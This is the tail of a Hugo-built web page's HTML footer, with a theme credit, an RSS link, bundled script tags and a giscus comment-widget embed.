        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL
      </a>
    </div>
  </div>
</div><div class="row text-center">
  <div class="col-12 mt-2">
    <p class="mb-2"></p>
    <p class="text-secondary mb-2"><small></small></p><div class="copyright mb-2 text-secondary">
  <small>
</small>
</div>
<div class="powered-by mb-2 text-secondary">
  <small>
    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
  </small>
</div>


<nav class="social-links nav justify-content-center mb-2 mt-3">
  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" href="/index.xml" title="RSS" rel="me">
    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
  </a>
</nav>
</div>
  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
</div>
</footer>
<script data-precache src="/assets/main/bundle.min.201e1ce5aa21d928e8aefdcb2f2aa779baa925bf77d25f0b8ed731de0b67c1ee.js" integrity="sha256-IB4c5aoh2Sjorv3LLyqnebqpJb930l8Ljtcx3gtnwe4=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.529b67926ad53aa2318e9281e6dab323480cd1d706cd65c17ecf3f7375485d1e.js" integrity="sha256-UptnkmrVOqIxjpKB5tqzI0gM0dcGzWXBfs8/c3VIXR4=" crossorigin="anonymous" defer></script>
<script data-precache src="/assets/viewer/bundle.min.44f880800e276b38818d7a3492c9f6cc185201fe3f2f95470972318a6d8ee2ff.js" integrity="sha256-RPiAgA4naziBjXo0ksn2zBhSAf4/L5VHCXIxim2O4v8=" crossorigin="anonymous" defer></script>
<script src="/js/sw-register.js" defer></script>
<script src="https://giscus.app/client.js"
    data-repo="https://github.com/ticodevv"
    data-repo-id="R_kgDOHJi95g"
    data-category="General"
    data-category-id="DIC_kwDOHJi95s4CTy6q"
    data-mapping="pathname"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="preferred_color_scheme"
    data-lang="en"
    data-loading="lazy"
    crossorigin="anonymous"
    defer>
</script>


  </body>
</html>
